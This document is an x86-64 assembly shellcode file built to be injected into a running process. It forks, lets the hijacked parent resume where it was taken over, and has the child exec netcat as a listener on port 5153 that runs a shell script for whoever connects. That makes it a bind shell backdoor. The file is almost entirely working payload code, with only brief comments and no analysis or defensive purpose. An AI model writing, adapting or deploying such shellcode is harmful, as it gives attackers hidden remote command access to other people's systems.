##
# Spawns nc in a forked process
# && it's valid shell code :)

  .text

.global _start

_start:
  # Save some things we'll be mucking with here so as to not
  # disturb our host process
  push %rbp
  push %rax
  push %r8

  # Call fork()
  xor %rax, %rax
  movb $57, %al
  syscall

  # If we are the new thread, jump to nc
  xor %r8, %r8
  cmp %rax, %r8
  je define_vars

  # Else restore the registers and "return"
  # injector has setup our stack such that we should be able
  # to return to the place where we took over
  pop %r8
  pop %rax
  pop %rbp
  ret

define_vars:
  push %rbp
  sub $0x30, %rsp
  call define_param1 
  .asciz "/usr/bin/nc"

define_param1:
  pop %rdi
  mov %rdi, -0x30(%rbp)
  call define_param2
  .asciz "-l"

define_param2:
  pop %r9
  mov %r9, -0x28(%rbp)
  call define_param3
  .asciz "-p"

define_param3:
  pop %r9
  mov %r9, -0x20(%rbp)
  call define_param4
  .asciz "5153"

define_param4:
  pop %r9
  mov %r9, -0x18(%rbp)
  call define_param5
  .asciz "-e"

define_param5:
  pop %r9
  mov %r9, -0x10(%rbp)
  call syscalls
  .asciz "/usr/bin/ncshell.sh"
  


syscalls:
  pop %r9
  mov %r9, -0x08(%rbp)


  xor %rax, %rax
  mov %rax, -0x0(%rbp)

  #mov -0x30(%rbp), %rdi
  lea -0x30(%rbp), %rsi
  lea 0x00(%rbp), %rdx

  #xor %r9, %r9
  #mov %r9, -0x08(%rbp)

  #lea 0x0(%rdi), %rsi
  #lea 0x0(%rsi), %rsi
  #lea -0x08(%rbp), %rdx
  
  mov $59, %al
  #lea -0x34(%rbp), %rdi
  #lea -0x78(%rbp), %rsi
  #lea -0x48(%rbp), %rdx
  syscall
